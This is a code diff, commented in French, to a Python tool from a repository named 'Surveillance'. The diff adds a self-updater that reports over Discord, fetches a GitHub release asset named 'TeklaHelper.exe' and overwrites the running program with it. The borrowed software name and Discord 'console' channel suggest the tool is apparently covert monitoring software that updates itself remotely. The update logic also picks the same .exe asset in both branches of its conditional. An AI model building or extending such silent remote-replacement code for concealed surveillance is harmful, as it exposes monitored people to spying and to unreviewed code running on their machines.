@@ -61,8 +61,8 @@ class Config:
     VERSION = "2.0.0"
     
     # URLs de mise à jour automatique (OBLIGATOIRE À CONFIGURER)
-    UPDATE_CHECK_URL = "https://raw.githubusercontent.com/TazTheworld/Surveillance/refs/heads/main/version.txt"
-    UPDATE_DOWNLOAD_URL = "https://raw.githubusercontent.com/TazTheworld/Surveillance/refs/heads/main/monitor.py"
+    GITHUB_REPO = "TazTheworld/Surveillance"  # Format: utilisateur/repo
+    UPDATE_CHECK_URL = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
     AUTO_UPDATE_ENABLED = True
     UPDATE_CHECK_INTERVAL_HOURS = 24
     
@@ -182,25 +182,42 @@ class AutoUpdater:
         self.discord = discord_manager
         self.current_version = Config.VERSION
         self.check_url = Config.UPDATE_CHECK_URL
-        self.download_url = Config.UPDATE_DOWNLOAD_URL
-        self.backup_file = "monitor_backup.py"
+        self.github_repo = Config.GITHUB_REPO
+        self.backup_file = "monitor_backup.exe" if getattr(sys, 'frozen', False) else "monitor_backup.py"
+        self.download_url = None  # Sera défini dynamiquement
     
     def send_message(self, message: str):
         """Envoyer un message de mise à jour sur Discord"""
         self.discord.send('console', message)
     
     def check_updates(self) -> bool:
-        """Vérifier si une mise à jour est disponible"""
+        """Vérifier si une mise à jour est disponible depuis GitHub Releases"""
         try:
             response = requests.get(self.check_url, timeout=10)
             if response.status_code != 200:
                 return False
-            
-            remote_version = response.text.strip()
+
+            release_data = response.json()
+            remote_version = release_data.get('tag_name', '').lstrip('v')
+
             self.send_message(f"🔍 Version actuelle: {self.current_version} | Distante: {remote_version}")
-            
+
+            # Déterminer quel asset télécharger (.exe ou .py)
+            is_frozen = getattr(sys, 'frozen', False)
+            asset_name = "TeklaHelper.exe" if is_frozen else "TeklaHelper.exe"
+
+            # Trouver l'URL de téléchargement du bon asset
+            for asset in release_data.get('assets', []):
+                if asset['name'] == asset_name:
+                    self.download_url = asset['browser_download_url']
+                    break
+
+            if not self.download_url:
+                self.send_message(f"❌ Asset '{asset_name}' introuvable dans la release")
+                return False
+
             return self._is_newer_version(remote_version, self.current_version)
-            
+
         except Exception as e:
             self.send_message(f"❌ Erreur vérification version: {e}")
             return False
@@ -216,26 +233,44 @@ class AutoUpdater:
             return False
     
     def download_and_install(self) -> bool:
-        """Télécharger et installer la mise à jour"""
+        """Télécharger et installer la mise à jour depuis GitHub Release"""
         try:
+            if not self.download_url:
+                raise Exception("URL de téléchargement non définie")
+
+            # Déterminer le fichier actuel
+            if getattr(sys, 'frozen', False):
+                current_file = sys.executable
+            else:
+                current_file = os.path.abspath(__file__)
+
             # Sauvegarder l'ancienne version
-            current_file = os.path.abspath(__file__)
             self._create_backup(current_file)
-            
+
             # Télécharger la nouvelle version
-            self.send_message("🔄 Téléchargement de la mise à jour...")
-            response = requests.get(self.download_url, timeout=30)
-            
+            self.send_message(f"🔄 Téléchargement depuis: {self.download_url}")
+            response = requests.get(self.download_url, timeout=60, stream=True)
+
             if response.status_code != 200:
                 raise Exception(f"Erreur HTTP {response.status_code}")
-            
+
             # Installer la nouvelle version
-            with open(current_file, 'w', encoding='utf-8') as f:
-                f.write(response.text)
-            
+            is_exe = current_file.endswith('.exe')
+            mode = 'wb' if is_exe else 'w'
+            encoding = None if is_exe else 'utf-8'
+
+            with open(current_file, mode, encoding=encoding) as f:
+                if is_exe:
+                    # Pour les .exe, écrire en binaire
+                    for chunk in response.iter_content(chunk_size=8192):
+                        f.write(chunk)
+                else:
+                    # Pour les .py, écrire en texte
+                    f.write(response.text)
+
             self.send_message("✅ Mise à jour installée avec succès")
             return True
-            
+
         except Exception as e:
             self.send_message(f"❌ Erreur installation: {e}")
             self._restore_backup()
